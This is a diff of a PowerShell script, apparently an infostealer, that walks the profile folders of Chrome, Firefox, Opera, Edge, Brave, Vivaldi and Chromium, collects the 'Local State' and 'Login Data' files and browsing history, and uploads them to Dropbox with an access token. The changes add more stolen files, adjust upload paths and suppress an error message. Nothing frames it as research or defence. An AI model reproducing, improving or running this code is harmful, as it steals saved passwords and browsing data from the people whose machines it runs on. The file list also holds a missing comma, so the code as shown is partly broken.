@@ -1,12 +1,10 @@
-
-# Specify the path to the Local State file
 $paths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\",
     "$env:LOCALAPPDATA\Google\Chrome\User Data\",
     "$env:LOCALAPPDATA\Google\Chrome\User Data\",
     "$env:LOCALAPPDATA\Mozilla\Firefox\\Profiles\",
     "$env:APPDATA\Opera Software\Opera Stable\",
-    "$env:APPDATA\Opera Software\Opera GX\",
+    "$env:APPDATA\Opera Software\Opera GX Stable\",
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\",
     "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\",
     "$env:LOCALAPPDATA\Vivaldi\User Data\",
@@ -21,10 +19,13 @@ $paths = @(
     "$env:LOCALAPPDATA\Chromium\User Data\"
 
 )
-
 $files = @(
     "Local State",
-    "Login Data"
+    "Login Data",
+    "History",
+    "Default\History",
+    "Default\Visited Links"
+    "Default\Login Data",
 )
 
 
@@ -44,26 +45,28 @@ function Upload-ToDropbox {
         [Parameter(Mandatory = $true)]
         [string]$DestinationPath
     )
+    $DestinationPath = $DestinationPath -replace "\\", "/"
+    $DestinationPath = $DestinationPath.replace('\','/')
+
 
     $dropboxApiArg = @{
         "autorename" = $true
         "mode" = "add"
         "mute" = $false
-        "path" = "/$(${DestinationPath} -replace "\\", "/")"
+        "path" = "/$DestinationPath"
         "strict_conflict" = $false
     }
-
 
     $dropboxApiArgJson = $dropboxApiArg | ConvertTo-Json -Compress
     $dropboxApiArgJson = $dropboxApiArgJson -replace "`r`n", ""
     $FilePath = $FilePath -replace "\\", "/"
-    # Send the file content over HTTPS
+    $FilePath = $FilePath.replace('\','/')
+    # Send the file content over HTTPS 
 
     $headers = @{
         "Authorization" = "Bearer $AccessToken"
         "Dropbox-API-Arg" = $dropboxApiArgJson
     }
-
     Invoke-WebRequest -Uri "https://content.dropboxapi.com/2/files/upload" `
         -Method Post `
         -Headers $headers `
@@ -79,15 +82,15 @@ foreach ($path in $paths) {
                 $parentDirectory = Split-Path -Path $fullPath -Parent
                 $grandParentDirectory = Split-Path -Path $parentDirectory -Parent
                 $greatGrandParentDirectory = Split-Path -Path $grandParentDirectory -Parent
-                $relativePath = $fullPath.Replace($greatGrandParentDirectory + "\", "")
+                $greatGreatGrandParentDirectory = Split-Path -Path $greatGrandParentDirectory -Parent
+                $relativePath = $fullPath.Replace($greatGreatGrandParentDirectory + "\", "")
                 $OutPath = Join-Path -Path $currentUser -ChildPath $relativePath
                 Upload-ToDropbox -FilePath $fullPath -DestinationPath $OutPath
             } catch {
-                Write-Output "Failed processing file: $_"
+               Write-Host $_.Exception.Message
             } 
         }
     } catch {
-        Write-Output "Failed processing path: $_"
+        
     }
 }
-
